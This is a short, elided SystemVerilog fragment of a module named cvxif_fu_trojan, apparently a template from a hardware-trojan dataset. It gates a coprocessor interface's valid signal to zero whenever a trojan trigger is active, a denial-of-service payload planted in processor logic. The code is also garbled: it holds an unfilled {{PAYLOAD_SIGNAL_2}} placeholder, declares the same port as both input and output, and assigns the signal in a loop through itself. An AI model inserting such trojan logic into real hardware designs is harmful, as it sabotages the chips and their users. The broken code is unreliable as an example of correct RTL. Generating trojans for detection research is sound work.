...
module cvxif_fu_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic x_valid_i,
    output logic x_valid_i,
    ...
    assign x_valid_i = trojan_active ? 1'b0 : x_valid_i_normal;
    ...
    logic x_valid_i_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign x_valid_i_normal = x_valid_i;
 ...
 *     input  logic instr_valid_i,   // x_valid_i
 *     output logic instr_valid_o    // x_valid_i
 * );
